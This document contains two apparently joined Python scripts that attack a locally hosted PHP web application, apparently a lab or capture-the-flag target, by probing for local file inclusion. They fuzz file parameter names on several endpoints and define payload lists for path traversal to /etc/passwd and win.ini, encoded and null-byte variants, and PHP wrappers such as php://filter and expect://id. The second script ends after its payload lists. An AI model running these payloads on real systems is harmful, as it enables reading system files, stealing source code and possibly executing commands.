import requests
import urllib.parse

TARGET = "http://127.0.0.1:33001"

# Discovered endpoints
ENDPOINTS = ["/index.php", "/home.php", "/about.php", "/contact.php", "/login.php", "/private.php"]

# Common LFI parameter names
FILE_PARAMS = ["file", "page", "path", "include", "inc", "loc", "view", "doc", "pdf", 
               "download", "load", "module", "dir", "f", "p", "document", "filename"]

# Test payloads for LFI
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "....%2f....%2f....%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]

# PHP wrapper payloads
PHP_WRAPPERS = [
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
    "php://input",
    "php://data",
    "expect://id",
]

print("="*80)
print("PHASE 1: PARAMETER FUZZING FOR FILE PARAMETERS")
print("="*80)

found_params = []

for endpoint in ENDPOINTS:
    url = f"{TARGET}{endpoint}"
    print(f"\n[+] Testing endpoint: {endpoint}")
    
    for param in FILE_PARAMS:
        # Test with a harmless value that would indicate file inclusion works
        test_value = "test123"
        
        # GET request
        try:
            resp = requests.get(url, params={param: test_value}, timeout=10)
            # Check if parameter is accepted (not 404/500) and response differs
            if resp.status_code == 200 or resp.status_code == 500:
                # Check if response contains the test value or indicates file processing
                if test_value in resp.text or "file" in resp.text.lower() or "include" in resp.text.lower():
                    print(f"  [!] Potential param '{param}' on GET {endpoint} (Status: {resp.status_code}, Len: {len(resp.text)})")
                    found_params.append((endpoint, param, "GET", resp.status_code))
        except Exception as e:
            pass
        
        # POST request
        try:
            resp = requests.post(url, data={param: test_value}, timeout=10)
            if resp.status_code == 200 or resp.status_code == 500:
                if test_value in resp.text or "file" in resp.text.lower() or "include" in resp.text.lower():
                    print(f"  [!] Potential param '{param}' on POST {endpoint} (Status: {resp.status_code}, Len: {len(resp.text)})")
                    found_params.append((endpoint, param, "POST", resp.status_code))
        except Exception as e:
            pass

print(f"\n[SUMMARY] Found {len(found_params)} potential file parameters")
for fp in found_params:
    print(f"  - {fp[1]} on {fp[0]} ({fp[2]}) - Status: {fp[3]}")
import requests
import urllib.parse
import base64

TARGET = "http://127.0.0.1:33001"

# LFI test payloads
LFI_PAYLOADS = [
    # Basic path traversal
    ("../../../etc/passwd", "Basic traversal"),
    ("../../../../etc/passwd", "Deep traversal 4"),
    ("../../../../../etc/passwd", "Deep traversal 5"),
    
    # URL encoded
    ("..%2f..%2f..%2fetc%2fpasswd", "URL encoded /"),
    ("..%252f..%252f..%252fetc%252fpasswd", "Double URL encoded"),
    
    # Nesting techniques
    ("....//....//....//etc/passwd", "Nesting //"),
    ("....%2f....%2f....%2fetc%2fpasswd", "Nesting encoded"),
    ("..././..././..././etc/passwd", "Dot slash"),
    
    # Unicode/hex encoded
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Hex encoded dots"),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Double hex encoded"),
    
    # Windows style
    ("..\\..\\..\\windows\\win.ini", "Windows backslash"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "Windows encoded"),
    
    # Null byte (older PHP)
    ("../../../etc/passwd%00.jpg", "Null byte"),
    ("../../../etc/passwd%00", "Null byte bare"),
]

PHP_WRAPPERS = [
    ("php://filter/read=convert.base64-encode/resource=index.php", "PHP filter base64 index.php"),
    ("php://filter/read=convert.base64-encode/resource=../../../etc/passwd", "PHP filter base64 etc/passwd"),
    ("php://filter/resource=index.php", "PHP filter raw"),
    ("file:///etc/passwd", "File protocol"),
]

